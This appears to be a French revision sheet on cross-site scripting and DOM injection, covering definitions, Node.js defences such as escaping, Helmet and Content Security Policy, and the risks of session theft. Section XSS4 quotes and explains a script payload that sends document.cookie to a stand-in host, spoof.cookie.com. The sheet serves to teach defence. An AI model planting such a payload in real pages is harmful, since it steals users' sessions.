<!-- INSTRUCTION_AUDIO:
Lis chaque question puis immédiatement sa réponse.
Adopte un ton formel, professionnel et motivant.
Ne lis pas ce bloc.
-->

# **2. XSS & Manipulation du DOM**

_(Source : I183-TS2-ListeDesQuestions.pdf)_

<a id="xss1"></a>

## **XSS1 — Définition**

Une faille XSS (pour Cross-Site Scripting) est une vulnérabilité de sécurité web qui permet à un attaquant d'injecter du code malveillant (généralement du JavaScript) dans une page web visitée par d'autres utilisateurs.

Contrairement à d'autres attaques qui visent la base de données (comme les injections SQL), l'XSS vise directement les visiteurs du site. Le site web sert involontairement de "complice" pour livrer le code malveillant au navigateur de la victime.
Une faille XSS permet à un attaquant :

- d’exécuter du JavaScript,
- dans la page consultée par la victime,
- sans toucher au serveur.

C’est l’une des failles les plus fréquentes.
Elle peut donner un accès complet à la session, modifier l’interface, ou détourner les formulaires.

---

<a id="xss2"></a>

## **XSS2 — Protection en Node.js**

Protection efficace → combinaison de plusieurs approches :

1. **Échappement systématique** du contenu avant affichage dans les templates.
2. **Frameworks modernes** (React, Vue, Angular) qui échappent automatiquement le HTML injecté.
3. Validation stricte côté serveur :
   - Utiliser des middlewares comme **Helmet** (`app.use(helmet())`) pour sécuriser les headers HTTP.

- supprimer les balises `<script>`,
- filtrer les événements HTML (`onclick`, `onload`).

4. Application d’une **Content Security Policy** :

- empêche l’exécution de scripts inline,
- limite les sources autorisées,
- bloque les injections même si elles passent dans le DOM.

Une bonne CSP peut neutraliser **la majorité des XSS**.

---

<a id="xss3"></a>

## **XSS3 — Une XSS peut-elle voler un mot de passe ?**

Indirectement, oui.
Une XSS peut :

- voler les cookies de session,
- voler les tokens JWT stockés dans le localStorage,
- intercepter les frappes,
- imiter un formulaire de connexion,
- envoyer toute donnée entrée par la victime vers un serveur pirate.

En pratique, l’attaquant vole la **session**, ce qui équivaut à voler l'accès complet du compte.

---

<a id="xss4"></a>

## **XSS4 — Effet du script fourni**

Le script :

> `<script language=etmlscript>console.log("you have been hacked by Narut0"); window.location.href="https://spoof.cookie.com?data="+document.cookie;</script>`

Si ce script est exécuté (malgré l'attribut `language` exotique) :

1. **Message console** : Affiche "you have been hacked by Narut0" (Preuve de concept).
2. **Vol de session** : Redirige l'utilisateur vers `spoof.cookie.com`.
3. **Exfiltration** : Passe le contenu de `document.cookie` (contenant l'ID de session) en paramètre GET `data`.

En plus :

- l’attaquant peut rejouer la session ailleurs,
- contourner la connexion,
- agir comme si c’était la victime.

C’est l’un des scénarios XSS les plus classiques et les plus dangereux.

---

<a id="xss5"></a>

## **XSS5 — DOM Injection**

Ici, la faille provient du **côté client**, souvent lorsque :

- on insère du HTML directement dans `innerHTML`,
- on manipule des chaînes non filtrées dans le DOM,
- on charge du contenu issu de l’URL sans validation.

Ces attaques ne passent parfois même **pas par le serveur**, ce qui les rend difficiles à détecter.

---
